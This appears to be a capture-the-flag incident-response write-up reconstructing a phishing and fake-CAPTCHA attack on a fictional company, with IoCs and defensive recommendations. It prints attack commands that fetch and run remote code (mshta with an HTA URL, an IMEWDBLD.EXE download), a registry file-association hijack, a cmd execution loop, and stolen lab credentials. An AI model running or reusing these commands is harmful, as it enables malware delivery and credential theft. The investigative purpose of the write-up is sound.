# Week 2 - Stealer's Shadow 👤

**Challenge Name:** Data Exfiltration Incident Analysis  
**Difficulty:** Intermediate  
**Category:** Incident Response, Malware Analysis, Threat Intelligence  
**Date Completed:** October 15, 2025

---

## 📖 Challenge Overview

A shadow slips through the Cyber Realms – unseen, yet unmistakable. Wherever it passes, something vanishes: arcane records, realm bound contracts, and the encrypted wills of sovereign guilds.

This week's investigation focuses on **Stealer's Shadow**, a sophisticated attack against **The Etherians** (Megacorp One), a rising power in construct-binding and spellcode crafting. The threat actor successfully infiltrated their systems, executed code remotely, and exfiltrated sensitive data through multiple stages of obfuscation.

As a digital investigator, my mission was to:
1. Identify exfiltrated files and the tools used
2. Trace how the malware was downloaded and executed
3. Reconstruct the complete attack chain from initial contact
4. Analyze C2 infrastructure and endpoints
5. Decrypt exfiltrated data and assess the damage
6. Extract sensitive information from stolen data
7. Map the attacker's infrastructure

---

## 🎯 Challenge Questions & Solutions

### Question 1: Exfiltrated Files and Programs
**Task:** What specific file was exfiltrated and which program was used to carry out the exfiltration? Include SHA-256 hashes.

**Answer:**
- **Exfiltrated file:** `101010245WK001_protected.zip`
  - SHA-256: `0324d54bc6c0f2dfa54b32bc68c16fd401778c10a9e9780b9cda0f31ae960d9c`
- **Program used:** `captcha_privacy[1].epub`
  - SHA-256: `a88fedc93a1d80c8cea08fbcb6b001293ddf357e27d268b32c5cfd23a49e96ed`

**Discovery:** Found in Sysmon logs (Event ID 23 - File Delete/Archive operation)

---

### Question 2: Download and Execution Method
**Task:** How was the exfiltration program downloaded and executed on the compromised system?

**Answer:**
- **Download method:** Malicious HTA using `IMEWDBLD.EXE` to HTTP-download the payload
- **Download location:** User web cache at `...INetCache\IE\66HCZK0X\captcha_privacy[1].epub`
- **Execution method:** Registry hijack of `.epub` to `exefile`, then `start` command to launch the downloaded `.epub` as an executable

**Technical Details:**
- LOLBin abuse of Windows IME Dictionary Builder (IMEWDBLD.EXE)
- Registry modification allowed .epub files to execute as programs
- Automated execution via cmd.exe loop searching INetCache

---

### Question 3: Complete Attack Chain
**Task:** Describe how the attackers achieved code execution to download and run the exfiltration program. Include all technical indicators in chronological order.

**Answer:**

#### Stage 1: Initial Contact - Phishing Email
- **Date:** August 5, 2025 at 08:35:42 UTC
- **Source IP:** `99.91.94.11`
- **Sender:** billing@zaffrevelox.com (spoofed as Spamwarriors Filter)
- **Recipient:** a.smith@megacorpone.com
- **Subject:** "License Renewal Notice"
- **Malicious Link:** `http://www.zaffrevelox.com`

#### Stage 2: Redirect to Fake CAPTCHA
- User clicked link which redirected to: `https://pfusioncaptcha.com`
- Site presented fake "I'm not a robot" CAPTCHA verification page

#### Stage 3: Blockchain-Based Payload Delivery
- JavaScript on pfusioncaptcha.com made eth_call to smart contract:
  - **RPC Server:** `http://31.17.87.96:8545/`
  - **Smart Contract:** `0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512`
  - **Function Selector:** `0x2cae8ae4`
- Retrieved Base64-encoded command: `mshta.exe http://pfusioncaptcha.com/13221442.hta`
- Command automatically copied to clipboard

#### Stage 4: Social Engineering Execution
- Page instructed user to: Press **Windows+R**, **Ctrl+V**, **Enter**
- User executed: `"C:\WINDOWS\System32\mshta.exe" http://pfusioncaptcha.com/13221442.hta`
- **Time:** 2025-08-05 09:01:16 UTC
- **Process ID:** 19424

#### Stage 5: HTA Downloads Malware (LOLBin Abuse)
- HTA script spawned: `"C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE" http://news.axonbyte.org:8000/captcha_privacy.epub`
- **DNS Resolution:** news.axonbyte.org → **145.1.0.92**
- **Downloaded to:** `C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub`

#### Stage 6: Registry Hijack
- HTA modified registry: `.epub` extension → `exefile` type

#### Stage 7: Automated Execution
- **Command:** `cmd.exe /c for /r "C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache" %i in (*.epub) do (start "" "%i" & exit)`
- Executed `captcha_privacy[1].epub` as malware (PID: 17852)
- **User Context:** MEGACORPONE\a.smith on WK001.megacorpone.com (10.10.10.245)

#### Complete IoC List:

**IPs:**
- `99.91.94.11` (phishing infrastructure)
- `31.17.87.96` (blockchain RPC server)
- `145.1.0.92` (C2 server and malware download)

**URLs:**
- **Email:** `http://www.zaffrevelox.com` → Redirect to `https://pfusioncaptcha.com`
- **HTA:** `http://pfusioncaptcha.com/13221442.hta`
- **Download:** `http://news.axonbyte.org:8000/captcha_privacy.epub`

**Blockchain:**
- **Contract:** `0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512`
- **RPC Endpoint:** `31.17.87.96:8545`

---

### Question 4: C2 Endpoints
**Task:** Identify the endpoints used by the attacker and explain their purpose.

**Answer:**

1. **`/life`** — Heartbeat / status beacon
   - Periodic check-ins from the host: minimal telemetry (host ID, uptime, timestamp, IP)
   - Used to confirm reachability and track alive clients

2. **`/send_message`** — Data exfiltration endpoint
   - Uploads collected data or files (supports chunking/resume)
   - Accepts metadata (filename, size, mime) and encrypted payload

3. **`/receive_message`** — Command & control pull
   - Client polls for operator instructions: job IDs, commands, execution parameters, and scheduled tasks
   - Responses are short to minimize noise

4. **`/feed`** — Covert RSS/Atom channel for config/ops
   - Stealthy distribution channel that looks like a benign RSS feed
   - Used to deliver encrypted configs, staged tasks, or operator signals without direct C2 connections

---

### Question 5: Data Protection Mechanism
**Task:** Determine how the exfiltrated data was protected. Specify encryption and password structure.

**Answer:**

**Encryption Scheme:** WinZip AE-2 (AES-256)
- Keys derived using PBKDF2 with HMAC-SHA1 (1,000 iterations) and per-file salt
- Data encrypted with AES-256 in CTR mode
- Authenticated via HMAC-SHA1
- ZIP member includes 2-byte password verifier

**Password Structure:**
- **Formula:** Machine GUID + Hostname
- **GUID:** `cc9441e5-1c80-4287-9c7a-4c03215c0969` (lowercase with hyphens)
- **Hostname:** `WK001` (uppercase)
- **Resulting Password:** `cc9441e5-1c80-4287-9c7a-4c03215c0969WK001`

---

### Question 6: Compromised Credentials
**Task:** Identify sensitive information that could enable further compromise of enterprise infrastructure.

**Answer:**

**Source:** Stolen from Chrome browser's saved passwords

**Compromised Accounts:**
```json
[
  {
    "origin": "https://portal.azure.com/",
    "username": "a.smith@megacorpone.com",
    "password": "ADG135QET246!v!"
  },
  {
    "origin": "https://accounts.google.com/",
    "username": "a.smith@megacorpone.com",
    "password": "ADG135QET246!v!"
  }
]
```

**Impact:** These credentials provide access to:
- Azure Portal (cloud infrastructure)
- Google Workspace (email, documents, admin access)
- Password reuse across multiple critical services

---

### Question 7: Attacker IP Addresses
**Task:** What IP addresses were involved in the attack chain and can be attributed to the attacker?

**Answer:**
- **99.91.94.11** - Phishing email redirector
- **31.17.87.96** - Blockchain RPC endpoint (port 8545) for payload retrieval
- **145.1.0.92** - C2 server and malware download (news.axonbyte.org)

**Note:** 145.1.0.92 appears twice in infrastructure (hosting and C2)

---

## 🔍 Investigation Methodology

### Tools & Techniques Used:
1. **Sysmon Log Analysis** - Event tracking and process monitoring
2. **Email Forensics** - Thunderbird mailbox analysis
3. **Browser Artifacts** - Edge preferences and cache analysis
4. **Network Analysis** - DNS queries and TCP connection tracking
5. **Registry Analysis** - File association hijacking detection
6. **Malware Analysis** - Static analysis of exfiltration program
7. **Blockchain Investigation** - Smart contract analysis via RPC calls
8. **Cryptographic Analysis** - ZIP encryption scheme identification

### Key Investigation Files:
- `log.txt` - Sysmon operational logs
- `INBOX` / `Trash` - Email artifacts
- `pfusioncaptcha.com.htm` - Fake CAPTCHA page
- `Edge Preferences` - Browser history and SSL decisions

---

## 🚨 Attack Timeline

| Time (UTC) | Event |
|------------|-------|
| Aug 5, 08:35:42 | Phishing email received |
| Aug 5, 09:01:16 | User executes mshta.exe with HTA URL |
| Aug 5, 09:01:16 | IMEWDBLD.EXE downloads captcha_privacy[1].epub |
| Aug 5, 09:01:18 | Registry hijack executed |
| Aug 5, 09:01:18 | Malware executed via start command |
| Aug 5, 09:01:45+ | C2 communications established (145.1.0.92) |
| Aug 5, 09:02:06 | Data exfiltration completed |

---

## 🛡️ Security Recommendations

### Immediate Actions:
1. ✅ Isolate compromised system WK001
2. ✅ Reset credentials for a.smith@megacorpone.com
3. ✅ Enable MFA on Azure and Google accounts
4. ✅ Block attacker IPs at perimeter firewall
5. ✅ Hunt for similar .epub files in INetCache across network

### Long-term Improvements:
1. **Email Security:**
   - Implement advanced URL filtering
   - Enable link rewriting/sandboxing
   - User awareness training on fake CAPTCHA attacks

2. **Endpoint Protection:**
   - Block IMEWDBLD.EXE usage via AppLocker
   - Monitor registry modifications to file associations
   - Deploy behavioral EDR solutions

3. **Network Security:**
   - Block outbound connections to blockchain RPC endpoints
   - Implement DNS sinkholing for known malicious domains
   - Monitor for HTA file downloads

4. **User Awareness:**
   - Train users to recognize fake CAPTCHA social engineering
   - Never execute clipboard content without verification
   - Report suspicious license renewal emails

---

## 📊 Indicators of Compromise (IoCs)

### Network Indicators:
```
99.91.94.11 - Phishing infrastructure
31.17.87.96 - Blockchain RPC endpoint
145.1.0.92 - C2 server / malware hosting
```

### URLs:
```
http://www.zaffrevelox.com - Phishing redirect
https://pfusioncaptcha.com - Fake CAPTCHA page
http://pfusioncaptcha.com/13221442.hta - Malicious HTA
http://31.17.87.96:8545/ - Ethereum RPC endpoint
http://news.axonbyte.org:8000/captcha_privacy.epub - Malware download
```

### File Hashes (SHA-256):
```
a88fedc93a1d80c8cea08fbcb6b001293ddf357e27d268b32c5cfd23a49e96ed - captcha_privacy[1].epub
0324d54bc6c0f2dfa54b32bc68c16fd401778c10a9e9780b9cda0f31ae960d9c - 101010245WK001_protected.zip
```

### Blockchain:
```
Contract: 0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512
Function: 0x2cae8ae4
```

### Registry Modification:
```
HKEY_CLASSES_ROOT\.epub → exefile association
```

---

## 📚 Lessons Learned

1. **Novel Attack Vectors:** Attackers are increasingly using blockchain smart contracts to deliver payloads, making traditional network defenses ineffective

2. **LOLBin Exploitation:** Legitimate Windows binaries like IMEWDBLD.EXE can be abused for malicious downloads, bypassing traditional AV

3. **Social Engineering Evolution:** Fake CAPTCHA pages are highly effective because users are conditioned to complete CAPTCHA challenges

4. **Defense in Depth:** Multiple security controls failed:
   - Email filtering didn't catch phishing
   - Browser didn't warn about malicious site
   - No EDR to detect LOLBin abuse
   - No alert on registry modification

5. **Password Hygiene:** Browser-stored passwords remain a high-value target for credential theft

---

## 🎓 Skills Demonstrated

- ✅ Advanced log analysis and correlation
- ✅ Email forensics and phishing investigation
- ✅ Browser artifact analysis
- ✅ Malware reverse engineering concepts
- ✅ Network traffic analysis
- ✅ Registry forensics
- ✅ Cryptographic analysis
- ✅ Blockchain technology understanding
- ✅ Incident response procedures
- ✅ Threat intelligence gathering
- ✅ IOC extraction and documentation

---

## 📌 Challenge Completion

**Status:** ✅ Completed  
**Score:** 7/7 Questions Answered Correctly  
**Completion Date:** October 15, 2025

---

**Investigator:** MR. Umair    
**Challenge Platform:** OffSec Legends - Echo Response Event
